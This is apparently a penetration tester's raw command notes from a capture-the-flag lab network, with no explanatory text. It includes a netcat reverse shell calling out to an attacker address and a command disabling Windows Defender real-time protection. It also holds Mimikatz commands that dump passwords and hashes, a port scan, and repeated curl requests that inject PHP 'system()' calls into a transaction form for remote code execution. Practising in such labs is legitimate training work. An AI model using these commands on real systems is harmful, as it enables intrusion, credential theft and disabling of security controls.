rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.3 443 >/tmp/f
python3 -c 'import pty; pty.spawn("/bin/bash")'
Set-MpPreference -DisableRealtimeMonitoring $true
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'

get-childitem -path c:\ -include flag.txt -recurse
Get-ChildItem -Recurse -File | where { Select-String -Path $_ -List -Pattern "OFFSHORE{" }

1..10000 | % {echo ((new-object Net.Sockets.TcpClient).Connect("172.16.3.103",$_)) "Port $_ is open!"} 2>$null

Get-ADGroup -Filter 'SID -ge "S-1-5-21-524867371-2016665888-3240400722-1000"' -Server CLIENT.OFFSHORE.COM

from=test&fromaddr=&to=test&toaddr=&amount=x') === true || system($_POST['cmd']) || is_numeric('x&comments=test&cmd=id

curl -i -s -k -X $'POST' \
    -H $'Host: 172.16.4.120' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1' -H $'Sec-Fetch-Dest: document' -H $'Sec-Fetch-Mode: navigate' -H $'Sec-Fetch-Site: none' -H $'Sec-Fetch-User: ?1' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 118' \
    -b $'lang=en-US; PHPSESSID=t6mdi2v4kcsg3lojihkl5lrhr4' \
    --data-binary $'from=test&fromaddr=&to=test&toaddr=&amount=x\') === true || system($_POST[\'cmd\']) || is_numeric(\'x&comments=test&cmd=id' \
    $'http://172.16.4.120/client/transactions/addTransaction.php'

curl 'http://127.0.0.1/client/transactions/addTransaction.php' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate, br' -H 'Connection: keep-alive' -H 'Cookie: lang=en-US; PHPSESSID=t6mdi2v4kcsg3lojihkl5lrhr4' -H 'Upgrade-Insecure-Requests: 1' -H 'Sec-Fetch-Dest: document' -H 'Sec-Fetch-Mode: navigate' -H 'Sec-Fetch-Site: same-origin' -H 'Sec-Fetch-User: ?1' -H 'Origin: http://127.0.0.1' -H 'Pragma: no-cache' -H 'Cache-Control: no-cache' --data-raw $'from=test&fromaddr=&to=test&toaddr=&amount=\'.system(\'id\').\'&comments=test'

curl 'http://172.16.4.120/client/transactions/addTransaction.php' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate, br' -H 'Connection: keep-alive' -H 'Cookie: lang=en-US; PHPSESSID=t6mdi2v4kcsg3lojihkl5lrhr4' -H 'Upgrade-Insecure-Requests: 1' -H 'Sec-Fetch-Dest: document' -H 'Sec-Fetch-Mode: navigate' -H 'Sec-Fetch-Site: same-origin' -H 'Sec-Fetch-User: ?1' -H 'Origin: http://172.16.4.120' -H 'Pragma: no-cache' -H 'Cache-Control: no-cache' --data-raw "from=test&fromaddr=&to=test&toaddr=&amount=x') === true || system($_POST['cmd']) || is_numeric('x&comments=test&cmd=id"

curl "http://172.16.4.120/client/transactions/addTransaction.php" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" -H "Accept-Language: en-GB,en;q=0.5" --compressed -H "DNT: 1" -H "Connection: keep-alive" -H "Cookie: PHPSESSID=iovkdt7qmsijn013nujlutvkv2" -H "Upgrade-Insecure-Requests: 1" -H "Origin: http://172.16.4.120" -H "Pragma: no-cache" -H "Cache-Control: no-cache" --data-raw "from=test&fromaddr=&to=test&toaddr=&amount=x') === true || system(`$_POST['cmd']) || is_numeric('x&comments=test&cmd=id"